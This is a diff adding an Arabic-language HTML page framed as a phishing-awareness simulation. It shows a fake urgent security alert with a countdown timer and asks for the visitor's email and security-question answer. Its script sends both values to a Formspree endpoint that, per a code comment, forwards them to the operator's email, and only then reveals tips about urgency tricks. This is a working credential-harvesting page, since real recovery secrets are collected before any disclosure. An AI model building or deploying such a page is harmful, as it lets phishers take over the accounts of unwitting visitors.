@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚠️ نظام الفحص والتحقق الأمني المشدد</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; text-align: center; padding: 50px 20px; color: #fff; }
+        .container { background: #2d2d2d; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); display: inline-block; max-width: 500px; width: 100%; box-sizing: border-box; border-top: 6px solid #d63031; }
+        h2 { color: #d63031; margin-bottom: 10px; }
+        .threat-intel { background: #3a1f1f; border: 1px solid #d63031; padding: 15px; border-radius: 6px; text-align: right; margin-bottom: 20px; font-size: 14px; color: #fab1a0; }
+        .timer-box { font-size: 22px; font-weight: bold; color: #e17055; margin: 15px 0; background: #222; padding: 10px; border-radius: 6px; border: 1px dashed #e17055; }
+        .form-group { text-align: right; margin-bottom: 20px; }
+        label { display: block; font-weight: bold; margin-bottom: 8px; color: #dfe6e9; }
+        input[type="text"], input[type="email"] { width: 100%; padding: 12px; border: 1px solid #555; background: #444; color: #fff; border-radius: 6px; box-sizing: border-box; font-size: 15px; }
+        input[type="submit"] { background-color: #d63031; color: white; border: none; padding: 12px 25px; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; transition: background 0.3s; }
+        input[type="submit"]:hover { background-color: #c0392b; }
+        
+        /* واجهة التوعية المخفية بعد الإرسال */
+        #awareness-page { display: none; text-align: right; }
+        .success-box { background-color: #1e3d59; border-right: 6px solid #27ae60; padding: 15px; border-radius: 4px; margin-bottom: 20px; font-weight: bold; color: #74b9ff; }
+        .tips-list { padding-right: 20px; line-height: 1.8; }
+        .tips-list li { margin-bottom: 10px; color: #dfe6e9; }
+    </style>
+</head>
+<body>
+
+<!-- المكون الأول: محاكاة التهديد والضغط النفسي -->
+<div class="container" id="quiz-page">
+    <h2>⚠️ تنبيه أمني: رصد نشاط غير اعتيادي</h2>
+    
+    <div class="threat-intel">
+        <strong>تفاصيل النظام المعرض للخطر:</strong><br>
+        • نظام التشغيل المستهدف: Puppy Linux (Bookworm Session)<br>
+        • حالة التهديد: محاولة وصول غير مصرح بها. يجب إثبات الهوية فوراً لمنع تجميد الحسابات المرتبطة.
+    </div>
+
+    <div class="timer-box">
+        الوقت المتبقي لتأكيد الهوية: <span id="timer">02:00</span> دقيقة
+    </div>
+    
+    <form id="awarenessForm">
+        <div class="form-group">
+            <label>أدخل البريد الإلكتروني الأساسي المرتبط بالنظام:</label>
+            <input type="email" id="email" required placeholder="example@email.com">
+        </div>
+
+        <div class="form-group">
+            <label>سؤال الأمان المعتمد: ما هو اسم أول صديق مقرب لك؟</label>
+            <input type="text" id="securityAnswer" required placeholder="اكتب الإجابة المطلوبة">
+        </div>
+
+        <input type="submit" value="تأكيد الهوية وإلغاء التجميد">
+    </form>
+</div>
+
+<!-- المكون الثاني: كشف الحقيقة ونشر الوعي -->
+<div class="container" id="awareness-page">
+    <h2 style="color: #27ae60; text-align: center;">🔒 نجحت المحاكاة! الدرس التعليمي</h2>
+    <div class="success-box">
+        تم إيقاف المحاكاة بنجاح. هذا الاختبار جزء من قياس ثباتك الأمني.
+    </div>
+    <p>لقد أظهرت النتائج استجابة سريعة للتهديد، ولكن تقنياً: <strong>لقد وقعت في فخ الضغط النفسي (Urgency Trick)</strong>. قام هذا الموقع بمحاكاة رسائل تهديد مصطنعة وقراءة نوع نظامك لدفعك لإدخال معلومات حساسة بشكل متسرع.</p>
+    
+    <h3>💡 ماذا نتعلم من هذا الاختبار؟</h3>
+    <ul class="tips-list">
+        <li><strong>لا تتفاعل تحت تأثير الذعر:</strong> المخترقون يعتمدون دائماً على أسلوب الإنذارات الكاذبة والمؤقتات الزمنية لإجبارك على التصرف دون تفكير.</li>
+        <li><strong>الأنظمة الحقيقية لا تطلب أسئلة أمان عبر روابط خارجية:</strong> شركات التقنية لا تطلب أبداً إجابات أسئلة الأمان السريعة لإلغاء قفل الحسابات عبر صفحات عشوائية.</li>
+        <li><strong>حماية الجلسات الحية (Live Sessions):</strong> استخدام أنظمة مثل Puppy Linux يوفر حماية جيدة لأنها لا تحفظ البيانات، ولكن تظل الهندسة الاجتماعية خطراً قائماً على مستوى المتصفح.</li>
+    </ul>
+</div>
+
+<script>
+// كود المؤقت التنازلي
+function startTimer(duration, display) {
+    var timer = duration, minutes, seconds;
+    var interval = setInterval(function () {
+        minutes = parseInt(timer / 60, 10);
+        seconds = parseInt(timer % 60, 10);
+
+        minutes = minutes < 10 ? "0" + minutes : minutes;
+        seconds = seconds < 10 ? "0" + seconds : seconds;
+
+        display.textContent = minutes + ":" + seconds;
+
+        if (--timer < 0) {
+            clearInterval(interval);
+            display.textContent = "انتهى الوقت!";
+        }
+    }, 1000);
+}
+
+window.onload = function () {
+    var twoMinutes = 60 * 2,
+        display = document.querySelector('#timer');
+    startTimer(twoMinutes, display);
+};
+
+// كود إرسال البيانات عبر AJAX
+document.getElementById('awarenessForm').addEventListener('submit', function(e) {
+    e.preventDefault(); 
+
+    var emailVal = document.getElementById('email').value;
+    var answerVal = document.getElementById('securityAnswer').value;
+
+    // استبدل بـ ID الخاص بـ Formspree لتلقي الرسائل على إيميلك
+    var formspreeUrl = 'https://formspree.io'; 
+
+    fetch(formspreeUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+        },
+        body: JSON.stringify({
+            Email_Test: emailVal,
+            Threat_Response_Answer: answerVal
+        })
+    })
+    .then(response => {
+        document.getElementById('quiz-page').style.display = 'none';
+        document.getElementById('awareness-page').style.display = 'block';
+    })
+    .catch(error => {
+        document.getElementById('quiz-page').style.display = 'none';
+        document.getElementById('awareness-page').style.display = 'block';
+    });
+});
+</script>
+
+</body>
+</html>
+  
